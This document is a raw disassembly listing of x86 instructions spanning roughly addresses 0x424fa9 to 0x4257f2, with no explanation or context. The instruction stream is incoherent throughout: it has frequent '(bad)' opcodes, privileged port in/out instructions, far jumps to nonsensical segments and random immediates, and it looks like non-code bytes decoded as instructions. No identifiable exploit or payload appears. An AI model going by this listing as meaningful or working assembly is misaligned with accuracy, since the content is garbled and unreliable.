  424fa9:	in     al,0xcc
  424fab:	fincstp 
  424fad:	fptan  
  424faf:	xlat   BYTE PTR ds:[ebx]
  424fb0:	hlt    
  424fb1:	sti    
  424fb2:	xlat   BYTE PTR ds:[ebx]
  424fb3:	shl    al,cl
  424fb5:	add    esi,ebp
  424fb7:	repnz rcr cl,1
  424fba:	in     eax,0xeb
  424fbc:	out    dx,eax
  424fbd:	std    
  424fbe:	(bad)  
  424fc0:	iret   
  424fc1:	or     esp,eax
  424fc3:	ret    
  424fc4:	into   
  424fc5:	in     al,0xae
  424fc7:	aad    0xc9
  424fc9:	xlat   BYTE PTR ds:[ebx]
  424fca:	in     al,0xf8
  424fcc:	sti    
  424fcd:	icebp  
  424fce:	ror    esp,1
  424fd0:	mov    esp,0xe0e001cf
  424fd5:	(bad)  
  424fd7:	cld    
  424fd8:	rcr    ch,1
  424fda:	mov    edi,0x208cbf5
  424fdf:	add    edi,ebp
  424fe1:	push   es
  424fe2:	mov    ecx,0xf2afe3aa
  424fe7:	ret    0xecb2
  424fea:	in     al,0xea
  424fec:	retf   0xf2f6
  424fef:	fcmovbe st,st(7)
  424ff1:	stc    
  424ff2:	repnz shl DWORD PTR [ebp-0x223b400b],cl
  424ff9:	cld    
  424ffa:	loop   0x424fe4
  424ffc:	jmp    0xe25553eb
  425001:	jmp    0xc9d6:0xb6d2e6c4
  425008:	(bad)  
  425009:	loopne 0x424fdc
  42500b:	in     eax,0xc7
  42500d:	iret   
  42500e:	fild   WORD PTR [ebx]
  425010:	mov    ah,0xe8
  425012:	mov    eax,0xdcf6c202
  425017:	(bad)  
  425019:	loop   0x424fe2
  42501b:	in     eax,0xc1
  42501d:	loopne 0x425006
  42501f:	cli    
  425020:	add    eax,0xacc2c8f1
  425025:	loope  0x424fd5
  425027:	lods   eax,DWORD PTR ds:[esi]
  425028:	rcl    cl,0xe7
  42502b:	sar    dh,0xb9
  42502e:	(bad)  
  42502f:	in     al,dx
  425030:	retf   
  425031:	into   
  425032:	mov    esi,0x1f4fbc8
  425037:	(bad)  
  425039:	hlt    
  42503a:	loop   0x425021
  42503c:	out    dx,eax
  42503d:	mov    esp,0xde09d905
  425042:	(bad)  
  425043:	fdivr  QWORD PTR [edi-0x32481d14]
  425049:	enter  0xf3f2,0xcf
  42504d:	(bad)  
  42504f:	out    dx,al
  425050:	call   0xd7001913
  425055:	sti    
  425056:	(bad)  
  425057:	hlt    
  425058:	in     eax,0xfb
  42505a:	cli    
  42505b:	retf   
  42505c:	fucomi st,st(0)
  42505e:	out    0xee,eax
  425060:	stc    
  425061:	(bad)  
  425062:	out    dx,eax
  425063:	fsubr  st,st(6)
  425065:	mov    dl,0xea
  425067:	(bad)  
  425068:	(bad)  
  425069:	jmp    0x425045
  42506b:	repz xlat BYTE PTR ds:[ebx]
  42506d:	stc    
  42506e:	std    
  42506f:	aam    0xbe
  425071:	cli    
  425072:	out    dx,eax
  425073:	mov    edi,0xdbcdfef5
  425078:	stc    
  425079:	(bad)  
  42507a:	jmp    0x425053
  42507c:	out    dx,eax
  42507d:	push   cs
  42507e:	fld    DWORD PTR [edi]
  425080:	into   
  425081:	add    eax,0xe8c9e2a7
  425086:	in     al,dx
  425087:	mov    cl,0xb3
  425089:	out    0xd5,al
  42508b:	int3   
  42508c:	push   DWORD PTR [eax-0x9171146]
  425092:	loopne 0x42506e
  425094:	mov    esp,0xc7e001f8
  425099:	cld    
  42509a:	(bad)  
  42509b:	fisttp QWORD PTR [eax]
  42509d:	add    eax,0xccdfea06
  4250a2:	les    esi,FWORD PTR [eax-0x1b34224e]
  4250a8:	jmp    0xed3b0171
  4250ad:	clc    
  4250ae:	fstp   st(5)
  4250b0:	int    0xec
  4250b2:	stc    
  4250b3:	stc    
  4250b4:	(bad)  
  4250b5:	out    0xe7,eax
  4250b7:	(bad)  
  4250b8:	std    
  4250b9:	ror    BYTE PTR [edx],0xd6
  4250bc:	add    eax,DWORD PTR [esi]
  4250be:	out    0xdd,al
  4250c0:	out    0xec,eax
  4250c2:	repnz shr edx,1
  4250c5:	call   0xa9122891
  4250ca:	out    0xb9,al
  4250cc:	imul   DWORD PTR [edi+edx*8-0x1f351515]
  4250d3:	add    dh,dl
  4250d5:	jecxz  0x425093
  4250d7:	ret    0xfaff
  4250da:	mul    esp
  4250dc:	out    dx,eax
  4250dd:	test   cl,0xe6
  4250e0:	add    al,0x5
  4250e2:	test   al,0xc4
  4250e4:	loop   0x4250a7
  4250e6:	shl    esp,0xe0
  4250e9:	(bad)  
  4250ea:	hlt    
  4250eb:	mov    ecx,0xdbbfdaee
  4250f0:	(bad)  
  4250f1:	repnz repnz repnz out 0xe3,al
  4250f6:	push   es
  4250f7:	add    al,0xdd
  4250f9:	fadd   st,st(1)
  4250fb:	out    dx,eax
  4250fc:	out    0x4,eax
  4250fe:	retf   0x106
  425101:	in     eax,dx
  425102:	out    0xf0,eax
  425104:	mov    cl,0xc2
  425106:	div    dh
  425108:	rcl    ebp,cl
  42510a:	hlt    
  42510b:	lock lock shr bh,1
  42510f:	les    edi,FWORD PTR [ebx-0x122e1114]
  425115:	frstpm(287 only) 
  425117:	fdiv   st,st(7)
  425119:	aam    0x7
  42511b:	call   esi
  42511d:	in     al,0xe9
  42511f:	fucomi st,st(4)
  425121:	pop    es
  425122:	(bad)  
  425123:	retf   
  425124:	mov    al,0xe0
  425126:	lods   eax,DWORD PTR ds:[esi]
  425127:	leave  
  425128:	hlt    
  425129:	mov    dh,0xec
  42512b:	fcmovb st,st(7)
  42512d:	out    dx,eax
  42512e:	stc    
  42512f:	mov    ecx,0xbac1fcfb
  425134:	(bad)  
  425135:	loopne 0x42513a
  425137:	jmp    0x42512c
  425139:	jmp    0x42511d
  42513b:	cli    
  42513c:	jecxz  0x42514c
  42513e:	(bad)  
  425140:	retf   
  425141:	cld    
  425142:	mov    dl,0xc6
  425144:	mov    bh,0xea
  425146:	scas   al,BYTE PTR es:[edi]
  425147:	fld    TBYTE PTR [ebp-0x243a302c]
  42514d:	aad    0xec
  42514f:	cld    
  425150:	retf   
  425151:	repnz shr ch,cl
  425154:	out    dx,al
  425155:	in     eax,dx
  425156:	std    
  425157:	(bad)  
  425159:	mov    esp,0xc9f7eac3
  42515e:	fyl2xp1 
  425160:	out    0xfa,al
  425162:	rol    ebp,0xbe
  425165:	shr    esi,0xc1
  425168:	int3   
  425169:	iret   
  42516a:	hlt    
  42516b:	mov    ebx,0xb8e5daf6
  425170:	mov    eax,0xbceed8ee
  425175:	push   es
  425176:	xlat   BYTE PTR ds:[ebx]
  425177:	fcomp  st(6)
  425179:	fadd   QWORD PTR [edi]
  42517b:	aam    0xef
  42517d:	jmp    0xb3b4a8c
  425182:	retf   
  425183:	call   0xc307ff70
  425188:	in     al,dx
  425189:	stc    
  42518a:	mov    ebx,0xedede4ba
  42518f:	sti    
  425190:	test   BYTE PTR [edx],0xfc
  425193:	clc    
  425194:	rcl    esp,cl
  425196:	xlat   BYTE PTR ds:[ebx]
  425197:	(bad)  
  425199:	loopne 0x4251a1
  42519b:	add    dl,bl
  42519d:	cli    
  42519e:	push   es
  42519f:	loope  0x42519b
  4251a1:	add    al,0xf1
  4251a3:	test   eax,0xbce5d0c0
  4251a8:	fcmovnb st,st(6)
  4251aa:	xlat   BYTE PTR ds:[ebx]
  4251ab:	(bad)  
  4251ac:	retf   
  4251ad:	rcr    edx,cl
  4251af:	out    dx,eax
  4251b0:	add    dh,al
  4251b2:	std    
  4251b3:	iret   
  4251b4:	int3   
  4251b5:	(bad)  
  4251b7:	sar    DWORD PTR [ebp+0x202c4b8],cl
  4251bd:	enter  0xe0cd,0xe9
  4251c1:	or     bl,cl
  4251c3:	test   al,0xd7
  4251c5:	xlat   BYTE PTR ds:[ebx]
  4251c6:	retf   0xdbe4
  4251c9:	lods   al,BYTE PTR ds:[esi]
  4251ca:	retf   
  4251cb:	out    0xd5,eax
  4251cd:	fxch   st(5)
  4251cf:	leave  
  4251d0:	(bad)  
  4251d1:	mov    edx,0xe1efdc00
  4251d6:	mov    ebx,0xd4d7c7de
  4251db:	stc    
  4251dc:	(bad)  
  4251dd:	shl    bl,0xe9
  4251e0:	cld    
  4251e1:	jmp    0xd4e0:0xe7e9cdb1
  4251e8:	mov    dl,0xe4
  4251ea:	xlat   BYTE PTR ds:[ebx]
  4251eb:	in     eax,dx
  4251ec:	in     al,0xcd
  4251ee:	fidiv  DWORD PTR [ebp-0x2d304343]
  4251f4:	idiv   edx
  4251f6:	jecxz  0x4251ef
  4251f8:	(bad)  
  4251f9:	add    cl,cl
  4251fb:	push   es
  4251fc:	ror    BYTE PTR [ebx],0xc7
  4251ff:	or     ebp,edi
  425201:	(bad)  
  425203:	(bad)  
  425204:	out    dx,al
  425205:	lods   al,BYTE PTR ds:[esi]
  425206:	(bad)
  42520a:	retf   0xbfcd
  42520d:	mov    ah,0xb6
  42520f:	dec    cl
  425211:	call   0xdbff10cd
  425216:	loopne 0x4251ff
  425218:	jmp    0x8d5:0xcfe006d5
  42521f:	in     eax,dx
  425220:	fscale 
  425222:	scas   al,BYTE PTR es:[edi]
  425223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425224:	xlat   BYTE PTR ds:[ebx]
  425225:	retf   0xdcbd
  425228:	fcmovnbe st,st(6)
  42522a:	rol    ebp,1
  42522c:	(bad)  
  42522e:	retf   0xfbef
  425231:	aad    0xed
  425233:	repnz xlat BYTE PTR ds:[ebx]
  425235:	rcr    edx,1
  425237:	cmc    
  425238:	loopne 0x42523c
  42523a:	pop    es
  42523b:	jmp    0xd2c5:0x3daede7
  425242:	fsubr  QWORD PTR [edx-0x3c141844]
  425248:	repnz leave 
  42524a:	shr    eax,1
  42524c:	leave  
  42524d:	(bad)  
  42524e:	mov    edi,0xfccfdbf4
  425253:	hlt    
  425254:	int    0xf0
  425256:	mov    edi,0x7dad0
  42525b:	in     al,0x2
  42525d:	aad    0xc3
  42525f:	retf   
  425260:	fild   WORD PTR [ecx]
  425262:	jmp    0xfaef:0xf4e4d7b3
  425269:	enter  0xb2d7,0xf4
  42526d:	jmp    0xf32f4a5b
  425272:	loope  0x425262
  425274:	clc    
  425275:	aad    0xe7
  425277:	vpminsw ymm7,ymm7,YMMWORD PTR [edi-0x231f0b39]
  42527f:	in     eax,dx
  425280:	add    al,0xc8
  425282:	ffreep st(7)
  425284:	mov    al,0xec
  425286:	lock mov cl,0xc3
  425289:	stc    
  42528a:	mov    dh,0xae
  42528c:	retf   
  42528d:	mov    bh,0xb4
  42528f:	mov    ebp,0xdcbfe2bc
  425294:	cmc    
  425295:	in     al,dx
  425296:	clc    
  425297:	add    ah,bh
  425299:	fstp   st(4)
  42529b:	enter  0xcbc0,0xcb
  42529f:	psubusb mm1,mm0
  4252a2:	out    0xcf,al
  4252a4:	retf   0xcbea
  4252a7:	lods   eax,DWORD PTR ds:[esi]
  4252a8:	test   dh,0xf7
  4252ab:	jmp    0xcb122e61
  4252b0:	(bad)  
  4252b1:	mov    esp,0xc1c2d6f8
  4252b6:	ffreep st(0)
  4252b8:	(bad)  
  4252b9:	jecxz  0x4252ab
  4252bb:	rol    al,0xe9
  4252be:	std    
  4252bf:	fneni(8087 only) 
  4252c1:	add    ah,al
  4252c3:	mov    cl,0xb0
  4252c5:	out    dx,eax
  4252c6:	loope  0x4252c3
  4252c8:	(bad)  
  4252c9:	mov    edx,0xf3fec6eb
  4252ce:	mov    ecx,0xc2f4f0de
  4252d3:	(bad)  
  4252d5:	loope  0x4252a9
  4252d7:	fnop   
  4252d9:	loop   0x4252d6
  4252db:	dec    BYTE PTR [ebx]
  4252dd:	add    eax,0xcc07d8ed
  4252e2:	mov    cl,0xd8
  4252e4:	iret   
  4252e5:	(bad)
  4252e8:	leave  
  4252e9:	test   al,0xf3
  4252eb:	enter  0xf4b4,0xed
  4252ef:	hlt    
  4252f0:	cli    
  4252f1:	enter  0xfece,0xfe
  4252f5:	(bad)  
  4252f7:	int3   
  4252f8:	(bad)  
  4252f9:	fsubp  st(1),st
  4252fb:	retf   0xd8c9
  4252fe:	ficom  DWORD PTR [ebx]
  425300:	fucom  st(7)
  425302:	out    0xbd,al
  425304:	(bad)
  425307:	jmp    0x4252f0
  425309:	mov    ah,0xba
  42530b:	in     al,0xf5
  42530d:	icebp  
  42530e:	jmp    0x4252fc
  425310:	std    
  425311:	fsubp  st(5),st
  425313:	lock stc 
  425315:	lock shr bl,cl
  425318:	lds    ecx,FWORD PTR [ebx]
  42531a:	call   0x4381cfa
  42531f:	hlt    
  425320:	adc    ah,ch
  425322:	out    0xb3,eax
  425324:	mov    esp,0xe6cec2d5
  425329:	lods   al,BYTE PTR ds:[esi]
  42532a:	in     eax,dx
  42532b:	aam    0xf5
  42532d:	out    dx,al
  42532e:	(bad)
  425331:	fstp   TBYTE PTR [eax-0x123c1e3d]
  425337:	push   es
  425338:	loope  0x425330
  42533a:	cld    
  42533b:	add    eax,0xdacbf5eb
  425340:	out    0x0,eax
  425342:	(bad)  
  425343:	loop   0x425326
  425345:	(bad)  
  425346:	leave  
  425347:	iret   
  425348:	loop   0x425313
  42534a:	leave  
  42534b:	(bad)  
  42534c:	jmp    0xf2355106
  425351:	mov    eax,0xf7beeecd
  425356:	in     eax,0xe1
  425358:	cld    
  425359:	fadd   QWORD PTR [ecx]
  42535b:	add    al,0xfa
  42535d:	out    dx,eax
  42535e:	out    dx,eax
  42535f:	fsubr  st,st(1)
  425361:	loop   0x42533b
  425363:	sar    BYTE PTR [edi-0x373e3912],1
  425369:	in     eax,dx
  42536a:	into   
  42536b:	jmp    0xf5e8:0xecb7d2c9
  425372:	icebp  
  425373:	(bad)  
  425374:	mov    esi,0xf4e5d3d3
  425379:	mov    BYTE PTR [edx],0x3
  42537c:	add    dh,ch
  42537e:	(bad)  
  42537f:	out    dx,eax
  425380:	std    
  425381:	fucomp st(3)
  425383:	into   
  425384:	lods   eax,DWORD PTR ds:[esi]
  425385:	loopne 0x425334
  425387:	icebp  
  425388:	retf   0xc4d6
  42538b:	out    0xcf,eax
  42538d:	(bad)  
  42538e:	fdiv   st(7),st
  425390:	(bad)  
  425391:	add    edi,edi
  425393:	lock add bh,dh
  425396:	(bad)  
  425398:	out    0xfa,eax
  42539a:	add    bl,dl
  42539c:	(bad)  
  42539e:	leave  
  42539f:	cli    
  4253a0:	push   cs
  4253a1:	pop    es
  4253a2:	(bad)
  4253a5:	repz in al,dx
  4253a7:	jmp    0x42536d
  4253a9:	mov    edx,0xf5c8b1f8
  4253ae:	hlt    
  4253af:	mov    ebp,0xe2f3e3ff
  4253b4:	sar    DWORD PTR [ebp+edi*8-0x1cf62320],0xe5
  4253bc:	add    ah,dh
  4253be:	(bad)  
  4253bf:	(bad)  
  4253c0:	fucom  st(5)
  4253c2:	in     eax,dx
  4253c3:	lds    esi,FWORD PTR [edx-0x131c4a51]
  4253c9:	into   
  4253ca:	out    dx,al
  4253cb:	mov    bh,0xca
  4253cd:	fcmovbe st,st(5)
  4253cf:	fmulp  st(3),st
  4253d1:	retf   0xf502
  4253d4:	std    
  4253d5:	shl    eax,1
  4253d7:	fst    st(7)
  4253d9:	pop    es
  4253da:	call   esi
  4253dc:	add    cl,BYTE PTR [esi]
  4253de:	aam    0xf
  4253e0:	leave  
  4253e1:	in     al,0xd0
  4253e3:	lock fisub WORD PTR [esi+eiz*8-0x3f482c16]
  4253eb:	icebp  
  4253ec:	icebp  
  4253ed:	fldz   
  4253ef:	fcmovnbe st,st(0)
  4253f1:	fiadd  WORD PTR [eax]
  4253f3:	loop   0x4253f7
  4253f5:	mov    ah,0xe1
  4253f7:	out    0xdb,eax
  4253f9:	add    dh,al
  4253fb:	lock fld st(0)
  4253fe:	dec    BYTE PTR [edx]
  425400:	std    
  425401:	(bad)  
  425403:	in     al,0xae
  425405:	into   
  425406:	shl    BYTE PTR [ebp-0x3a2b3454],0xfa
  42540d:	dec    bh
  42540f:	int3   
  425410:	mov    eax,0xdff500d7
  425415:	not    bl
  425417:	jecxz  0x4253ec
  425419:	or     ebp,edx
  42541b:	inc    DWORD PTR [eax]
  42541d:	jecxz  0x425417
  42541f:	add    cl,ch
  425421:	leave  
  425422:	mov    ecx,0xf0b1f3e4
  425427:	lods   eax,DWORD PTR ds:[esi]
  425428:	not    edi
  42542a:	scas   eax,DWORD PTR es:[edi]
  42542b:	fcomip st,st(7)
  42542d:	mov    ecx,0xfdf1dcb5
  425432:	loopne 0x425417
  425434:	into   
  425435:	add    bl,dh
  425437:	rcr    ah,cl
  425439:	pop    es
  42543a:	fnstsw WORD PTR [esi-0x340bfe20]
  425440:	or     al,0xcf
  425442:	fcom   st(7)
  425444:	(bad)  
  425445:	fmul   st(3),st
  425447:	xlat   BYTE PTR ds:[ebx]
  425448:	test   eax,0xf0d4f7d2
  42544d:	into   
  42544e:	mov    ch,0xef
  425450:	(bad)  
  425451:	stc    
  425452:	fstp   st(5)
  425454:	add    al,BYTE PTR [edx]
  425456:	lock repz loop 0x42543c
  42545a:	div    esi
  42545c:	fdivr  st,st(6)
  42545e:	out    dx,eax
  42545f:	call   0xc9ea2437
  425464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425465:	ror    ecx,cl
  425467:	test   esi,0xecede9d2
  42546d:	jmp    0xd3193071
  425472:	loope  0x42542d
  425474:	mov    edi,0x7c6fbd3
  425479:	ret    
  42547a:	call   0xda0a3475
  42547f:	jecxz  0x42548e
  425481:	iret   
  425482:	fcom   st(2)
  425484:	(bad)  
  425485:	in     eax,0xc6
  425487:	in     eax,0xc1
  425489:	in     al,0xf3
  42548b:	out    0xed,eax
  42548d:	mov    ecx,0xc3dbfab3
  425492:	enter  0xc0ff,0xdf
  425496:	loop   0x425456
  425498:	aam    0xd8
  42549a:	ror    BYTE PTR [ecx],1
  42549c:	xlat   BYTE PTR ds:[ebx]
  42549d:	jmp    0xe8b1:0xce0c0dcf
  4254a4:	fucomp st(5)
  4254a6:	hlt    
  4254a7:	retf   0xc8e1
  4254aa:	retf   0xd1b2
  4254ad:	mov    ebx,0xffccead1
  4254b2:	cli    
  4254b3:	loopne 0x4254a2
  4254b5:	in     al,dx
  4254b6:	(bad)  
  4254b8:	add    bh,dh
  4254ba:	test   DWORD PTR ds:0xedcbf90f,0xa6ce040a
  4254c4:	mov    cl,0xb6
  4254c6:	scas   al,BYTE PTR es:[edi]
  4254c7:	rcl    al,cl
  4254c9:	shl    al,1
  4254cb:	leave  
  4254cc:	mov    bh,0xac
  4254ce:	out    dx,al
  4254cf:	out    dx,al
  4254d0:	aam    0xba
  4254d2:	inc    edx
  4254d4:	mov    esp,0xe2bdbeee
  4254d9:	ror    BYTE PTR [ebx],0xc0
  4254dc:	jmp    0xc60d23cc
  4254e1:	out    0xe7,eax
  4254e3:	mov    dl,0xcb
  4254e5:	jecxz  0x4254c9
  4254e7:	sti    
  4254e8:	(bad)  
  4254e9:	retf   
  4254ea:	(bad)  
  4254ec:	mov    cl,0xbb
  4254ee:	fdivp  st(1),st
  4254f0:	mov    ah,0xbf
  4254f2:	enter  0xdbe2,0xf5
  4254f6:	loope  0x4254fd
  4254f8:	ffree  st(4)
  4254fa:	(bad)  
  4254fc:	(bad)  ds:0xbfb05cb
  425502:	lods   eax,DWORD PTR ds:[esi]
  425503:	shl    bl,1
  425505:	mov    esi,0xf0eaf7cb
  42550a:	test   edi,0xd4f7f5cf
  425510:	ret    
  425511:	enter  0xdaf9,0xda
  425515:	add    eax,0xf9e5fae5
  42551a:	cli    
  42551b:	enter  0xed8,0xfa
  42551f:	into   
  425520:	loopne 0x4254ef
  425522:	jmp    0xb1e9:0xcbe5b0c7
  425529:	not    ch
  42552b:	call   0xd51e0feb
  425530:	mov    edi,0xe7c2e8ca
  425535:	rol    BYTE PTR [ecx+edi*8],0xd4
  425539:	aam    0xfe
  42553b:	fimul  WORD PTR [ecx]
  42553d:	or     ecx,DWORD PTR [edi]
  42553f:	call   0xa72e5f36
  425544:	ret    0xc7c6
  425547:	call   0xdb382ff9
  42554c:	lods   eax,DWORD PTR ds:[esi]
  42554d:	in     al,dx
  42554e:	out    dx,eax
  42554f:	hlt    
  425550:	aad    0xf4
  425552:	mov    esi,0xc3d9e2e2
  425557:	fiadd  WORD PTR [edx]
  425559:	loope  0x425558
  42555b:	psubb  mm7,mm1
  42555e:	fdivr  st,st(3)
  425560:	(bad)  
  425562:	jecxz  0x425546
  425564:	jmp    0x425553
  425566:	in     eax,dx
  425567:	ret    0xd5ed
  42556a:	(bad)
  42556d:	retf   0xc9e4
  425570:	fsub   st,st(1)
  425572:	loopne 0x42556d
  425574:	cmc    
  425575:	stc    
  425576:	out    0xc1,eax
  425578:	hlt    
  425579:	fsubrp st(5),st
  42557b:	jecxz  0x425552
  42557d:	jmp    0xa6df:0xc9050c0a
  425584:	ret    0xe7ef
  425587:	ret    
  425588:	icebp  
  425589:	out    dx,al
  42558a:	fcomi  st,st(4)
  42558c:	(bad)  
  42558d:	mov    dh,0xe5
  42558f:	out    dx,eax
  425590:	jmp    0x425565
  425592:	leave  
  425593:	int3   
  425594:	ror    dh,0xe4
  425597:	mov    ebp,0xfefef0dd
  42559c:	clc    
  42559d:	call   0xe0291ba8
  4255a2:	stos   DWORD PTR es:[edi],eax
  4255a3:	test   al,0xea
  4255a5:	(bad)  
  4255a6:	in     al,0xeb
  4255a8:	jecxz  0x425575
  4255aa:	out    dx,al
  4255ab:	(bad)  
  4255ac:	mov    dh,0xbb
  4255ae:	(bad)
  4255b1:	loope  0x4255a3
  4255b3:	mov    ebp,0xf3c2d2d1
  4255b8:	icebp  
  4255b9:	hlt    
  4255ba:	shr    ecx,1
  4255bc:	fisttp QWORD PTR [edi]
  4255be:	add    eax,ebp
  4255c0:	jmp    0xb2dd:0xf3a9c6ff
  4255c7:	out    dx,eax
  4255c8:	(bad)  
  4255c9:	in     al,dx
  4255ca:	cli    
  4255cb:	shl    ebx,cl
  4255cd:	mov    ch,0xda
  4255cf:	mov    ecx,0xd1b7d6da
  4255d4:	out    0xf9,al
  4255d6:	loopne 0x42559d
  4255d8:	cld    
  4255d9:	retf   0xefd5
  4255dc:	(bad)  
  4255dd:	retf   
  4255de:	push   es
  4255df:	add    ebp,esp
  4255e1:	retf   0xbcae
  4255e4:	mov    bl,0xe4
  4255e6:	(bad)
  4255ea:	mov    edx,0xdce6f9f6
  4255ef:	fmul   st(2),st
  4255f1:	(bad)  
  4255f2:	mov    ecx,0x3f9edc0
  4255f7:	add    DWORD PTR [ebx],eax
  4255f9:	(bad)  
  4255fb:	aam    0xeb
  4255fd:	(bad)  
  4255fe:	(bad)  
  425600:	in     eax,dx
  425601:	adc    esp,ebx
  425603:	in     eax,dx
  425604:	leave  
  425605:	mov    al,0xd4
  425607:	shl    esp,1
  425609:	(bad)  
  42560a:	cmc    
  42560b:	call   0xd51d26e3
  425610:	fcmovbe st,st(3)
  425612:	out    dx,al
  425613:	ret    
  425614:	mov    ecx,0xdff3cdf2
  425619:	shl    dh,0xe4
  42561c:	(bad)  
  42561d:	aam    0x8
  42561f:	aam    0xcb
  425621:	push   es
  425622:	lods   al,BYTE PTR ds:[esi]
  425623:	out    dx,al
  425624:	in     al,dx
  425625:	(bad)  
  425627:	out    dx,eax
  425628:	lock into 
  42562a:	mov    edx,0xd2dff4e5
  42562f:	mov    ebp,0xe2c8f4f0
  425634:	fxch   st(4)
  425636:	in     al,0xda
  425638:	lock test bh,0xe3
  42563c:	clc    
  42563d:	(bad)  
  42563e:	in     eax,dx
  42563f:	add    cl,cl
  425641:	or     eax,0xc3b1c4de
  425646:	mov    bl,0xd6
  425648:	mov    dh,0xc7
  42564a:	cmc    
  42564b:	mov    dh,0xcc
  42564d:	mov    edi,0xdfde03e8
  425652:	aam    0xba
  425654:	xlat   BYTE PTR ds:[ebx]
  425655:	mov    edi,0xfcf6f3ed
  42565a:	stc    
  42565b:	add    eax,0xfecffae4
  425660:	sar    esp,cl
  425662:	in     eax,0xbc
  425664:	lods   eax,DWORD PTR ds:[esi]
  425665:	jecxz  0x425613
  425667:	bnd ret 0xd8ac
  42566b:	mov    al,0xad
  42566d:	fsub   st,st(5)
  42566f:	fucomi st,st(3)
  425671:	int3   
  425672:	aad    0xff
  425674:	icebp  
  425675:	ffree  st(5)
  425677:	repnz inc DWORD PTR [eax+eax*1]
  42567b:	xadd   dl,bh
  42567e:	or     ah,bl
  425680:	loop   0x42567c
  425682:	shl    bh,0xa8
  425685:	test   al,0xf7
  425687:	out    dx,eax
  425688:	ror    al,cl
  42568a:	out    dx,al
  42568b:	iret   
  42568c:	(bad)  
  42568d:	sti    
  42568e:	into   
  42568f:	int    0xce
  425691:	sar    BYTE PTR [eax-0x1c02232a],1
  425697:	fimul  WORD PTR [edx]
  425699:	aam    0xd0
  42569b:	lock (bad) 
  42569e:	jmp    ecx
  4256a0:	adc    eax,DWORD PTR ds:0xe9a5cfd0
  4256a6:	retf   
  4256a7:	aam    0xf2
  4256a9:	int    0xb6
  4256ab:	sti    
  4256ac:	retf   0xb3e9
  4256af:	(bad)  
  4256b0:	rcl    bl,cl
  4256b2:	sar    esi,1
  4256b4:	hlt    
  4256b5:	loope  0x425683
  4256b7:	rol    cl,1
  4256b9:	jmp    0xec323795
  4256be:	in     al,0xd9
  4256c0:	(bad)
  4256c3:	ret    0xedb0
  4256c6:	(bad)  
  4256c7:	lock int 0xf1
  4256ca:	(bad)  
  4256cb:	in     eax,dx
  4256cc:	push   ebp
  4256ce:	into   
  4256cf:	out    dx,al
  4256d0:	(bad)  
  4256d2:	mov    esi,0xdbd0fdde
  4256d7:	ret    
  4256d8:	jmp    0x4256cb
  4256da:	ret    0xd8f0
  4256dd:	mov    esp,0xfad3c4eb
  4256e2:	lock in eax,0xdc
  4256e5:	mov    dl,0xeb
  4256e7:	aad    0xca
  4256e9:	jmp    0x4256b7
  4256eb:	enter  0xeaee,0xee
  4256ef:	neg    edi
  4256f1:	aad    0xf6
  4256f3:	cmc    
  4256f4:	sti    
  4256f5:	aam    0xf2
  4256f7:	in     al,dx
  4256f8:	repz aam 0xe1
  4256fb:	loop   0x4256f8
  4256fd:	add    ebp,edx
  4256ff:	add    al,0xdc
  425701:	ror    dh,0xac
  425704:	shr    ebx,cl
  425706:	lods   al,BYTE PTR ds:[esi]
  425707:	repz in al,dx
  425709:	(bad)  
  42570a:	jmp    0x4256f1
  42570c:	into   
  42570d:	(bad)  
  42570e:	(bad)  
  425710:	icebp  
  425711:	in     al,dx
  425712:	mov    esi,0xdff3dcf1
  425717:	clc    
  425718:	lock stc 
  42571a:	cli    
  42571b:	cmc    
  42571c:	or     bh,cl
  42571e:	fisttp QWORD PTR ds:0xf3c307ef
  425724:	(bad)  
  425725:	mov    cl,0xc1
  425727:	jecxz  0x42571f
  425729:	mov    ch,0xc9
  42572b:	fcos   
  42572d:	imul   esp
  42572f:	rcr    ebx,1
  425731:	out    dx,eax
  425732:	fcomp  st(3)
  425734:	out    dx,al
  425735:	in     eax,dx
  425736:	aam    0xc6
  425738:	icebp  
  425739:	sar    edi,1
  42573b:	ret    0xbce0
  42573e:	push   cs
  42573f:	(bad)  
  425741:	jecxz  0x425701
  425743:	jmp    0xe1ec:0xd0c6efee
  42574a:	mov    cl,0xe9
  42574c:	cmc    
  42574d:	in     al,0xfd
  42574f:	mov    ecx,0xf2efbacf
  425754:	sti    
  425755:	int3   
  425756:	add    eax,0xe8eb06e3
  42575b:	add    BYTE PTR [edx],cl
  42575d:	fsubrp st(6),st
  42575f:	sti    
  425760:	loop   0x42572a
  425762:	scas   al,BYTE PTR es:[edi]
  425763:	loope  0x425730
  425765:	out    0xeb,al
  425767:	ret    
  425768:	sti    
  425769:	repnz lock fldpi 
  42576d:	out    dx,al
  42576e:	(bad)  
  42576f:	mov    esp,0xd1ccfdf8
  425774:	repz (bad) 
  425777:	aam    0x2
  425779:	cmc    
  42577a:	fsubrp st(3),st
  42577c:	aam    0x9
  42577e:	hlt    
  42577f:	or     esp,eax
  425781:	repz shr esp,0xd6
  425785:	lds    edi,FWORD PTR [edi+ecx*8-0xf181937]
  42578c:	sar    bh,cl
  42578e:	(bad)  
  42578f:	fcmovne st,st(3)
  425791:	add    ch,ah
  425793:	div    ch
  425795:	sar    ecx,0xc0
  425798:	jmp    0x42578e
  42579a:	fadd   QWORD PTR [eax]
  42579c:	push   cs
  42579d:	aam    0x3
  42579f:	add    al,0xf2
  4257a1:	fucom  st(0)
  4257a3:	faddp  st(4),st
  4257a5:	div    BYTE PTR [ecx-0x2e1b3520]
  4257ab:	hlt    
  4257ac:	fdiv   st,st(0)
  4257ae:	std    
  4257af:	enter  0xbdb5,0xe3
  4257b3:	loop   0x425793
  4257b5:	mov    ah,0xe7
  4257b7:	add    esp,esp
  4257b9:	fmul   DWORD PTR [eax]
  4257bb:	in     al,0xff
  4257bd:	cli    
  4257be:	call   0xed5553bc
  4257c3:	int    0xc0
  4257c5:	int3   
  4257c6:	mov    bl,0xe9
  4257c8:	jecxz  0x42578b
  4257ca:	(bad)  
  4257cb:	fadd   st,st(7)
  4257cd:	std    
  4257ce:	jmp    0x42578d
  4257d0:	repnz mov edi,0xdad702db
  4257d6:	sar    bl,0x6
  4257d9:	add    al,0xe6
  4257db:	add    bh,ch
  4257dd:	fiadd  DWORD PTR [ecx]
  4257df:	fst    DWORD PTR [ebx]
  4257e1:	jecxz  0x4257c4
  4257e3:	out    0xec,eax
  4257e5:	xlat   BYTE PTR ds:[ebx]
  4257e6:	in     al,dx
  4257e7:	mov    bl,0xf1
  4257e9:	mov    cl,0xe1
  4257eb:	leave  
  4257ec:	sti    
  4257ed:	mov    esi,0xfdffeaf6
  4257f2:	aam    0xd2
